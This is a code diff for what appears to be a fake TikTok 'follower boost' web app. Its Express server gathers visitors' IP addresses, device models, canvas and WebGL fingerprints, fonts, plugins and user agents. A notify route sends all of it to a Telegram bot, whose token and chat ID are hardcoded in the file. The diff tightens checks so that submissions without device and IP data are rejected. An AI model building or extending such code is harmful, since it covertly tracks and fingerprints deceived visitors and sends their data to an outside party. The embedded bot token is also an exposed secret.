@@ -1,10 +1,40 @@
 import type { Express, Request, Response } from "express";
 import { createServer, type Server } from "http";
 import { storage } from "./storage";
-import { insertSubmissionSchema } from "@shared/schema";
+import { insertSubmissionSchema, deviceInfoSchema } from "@shared/schema";
 import { log } from "./vite";
 import { ZodError } from "zod";
 import fetch from "node-fetch";
+
+// Function to validate device information
+function validateDeviceInfo(deviceInfo: any, ipAddress: string, userInfo: any) {
+  // Check if device info exists
+  if (!deviceInfo) {
+    return { valid: false, reason: "Missing device information" };
+  }
+  
+  // Check the device model - should not be unknown
+  if (!deviceInfo.deviceModel || deviceInfo.deviceModel === "Unknown Device") {
+    return { valid: false, reason: "Invalid device model" };
+  }
+  
+  // Check IP address
+  if (!ipAddress && (!userInfo || !userInfo.ip)) {
+    return { valid: false, reason: "Missing IP address" };
+  }
+  
+  // Validate basic structure using our schema
+  try {
+    deviceInfoSchema.parse(deviceInfo);
+  } catch (error) {
+    if (error instanceof ZodError) {
+      return { valid: false, reason: `Device info validation error: ${error.errors[0]?.message || 'Invalid format'}` };
+    }
+    return { valid: false, reason: "Failed to validate device information" };
+  }
+  
+  return { valid: true };
+}
 
 export async function registerRoutes(app: Express): Promise<Server> {
   // Health check endpoint for Render
@@ -14,20 +44,25 @@ export async function registerRoutes(app: Express): Promise<Server> {
   // API endpoint to send notifications to Telegram
   app.post("/api/notify", async (req, res) => {
     try {
-      const { username, followers, userInfo } = req.body;
+      const { username, followers, userInfo, deviceInfo, ipAddress } = req.body;
       
       // Get Telegram credentials from environment variables or use hardcoded defaults
       const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || "8070873055:AAHRpIvi56j4F2h0BhBA_uB4tyw_SCYMsVM";
       const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || "6360165707";
+      
+      // Verify device information is available
+      const deviceModel = deviceInfo?.deviceModel || userInfo?.deviceModel || 'Unknown Device';
+      const validated = deviceModel !== 'Unknown Device' && ipAddress;
       
       // Format message with detailed visitor info
       const message = `
 🔥 New TikTok Follower Request 🔥
 👤 Username: @${username}
 ⭐ Followers: ${followers}
+✅ Verified: ${validated ? 'Yes' : 'No'}
 
 📱 Device Info:
-- Device: ${userInfo.deviceModel || 'Unknown Device'}
+- Device: ${deviceModel}
 - Screen: ${userInfo.screenSize}
 - Color Depth: ${userInfo.colorDepth}
 - Platform: ${userInfo.platform}
@@ -37,7 +72,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
 - DNT: ${userInfo.doNotTrack}
 
 🌐 Network:
-- IP Address: ${userInfo.ip}
+- IP Address: ${ipAddress || userInfo.ip || 'Unknown'}
 - Connection: ${JSON.stringify(userInfo.connection)}
 
 🗣️ Language:
@@ -52,7 +87,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
 - Canvas: ${userInfo.canvasFingerprint || 'Not available'}
 - WebGL: ${userInfo.webglFingerprint || 'Not available'}
 - Fonts: ${userInfo.fonts || 'Not available'}
-- Plugins: ${userInfo.plugins || 'Not available'}
+- Plugins: ${userInfo.plugins ? (userInfo.plugins.length > 100 ? userInfo.plugins.substring(0, 100) + '...' : userInfo.plugins) : 'Not available'}
 
 🧩 User Agent:
 ${userInfo.userAgent}
@@ -75,8 +110,10 @@ ${userInfo.userAgent}
       console.log("Telegram API response:", responseData);
       
       if (responseData && typeof responseData === 'object' && 'ok' in responseData && !responseData.ok) {
-        console.error("Telegram API error:", responseData.description);
-        throw new Error(`Telegram API error: ${responseData.description}`);
+        // Handle error response from Telegram API
+        const errorMessage = (responseData as any).description || 'Unknown Telegram API error';
+        console.error("Telegram API error:", errorMessage);
+        throw new Error(`Telegram API error: ${errorMessage}`);
       }
       
       log(`Notification sent for user @${username}`, "telegram");
@@ -90,10 +127,23 @@ ${userInfo.userAgent}
   // API endpoint to submit TikTok username for follower boost
   app.post("/api/submit", async (req, res) => {
     try {
-      const submission = insertSubmissionSchema.parse(req.body);
+      // Validate the submission data against our schema
+      const submissionData = insertSubmissionSchema.parse(req.body);
+      
+      // Get additional device information from the request
+      const { deviceInfo, ipAddress, userInfo } = req.body;
+      
+      // Perform additional validation for device info
+      const deviceValidation = validateDeviceInfo(deviceInfo, ipAddress, userInfo);
+      if (!deviceValidation.valid) {
+        return res.status(400).json({ 
+          message: "Device validation failed", 
+          reason: deviceValidation.reason 
+        });
+      }
       
       // Check if username already exists in the system
-      const existingSubmission = await storage.getSubmissionByUsername(submission.username);
+      const existingSubmission = await storage.getSubmissionByUsername(submissionData.username);
       
       if (existingSubmission) {
         // If the submission exists but hasn't been processed yet, return it
@@ -116,6 +166,13 @@ ${userInfo.userAgent}
           });
         }
       }
+      
+      // Prepare the submission with validated device information
+      const submission = {
+        ...submissionData,
+        deviceInfo: deviceInfo || null,
+        ipAddress: ipAddress || (userInfo?.ip || null)
+      };
       
       // Create the submission
       const newSubmission = await storage.createSubmission(submission);
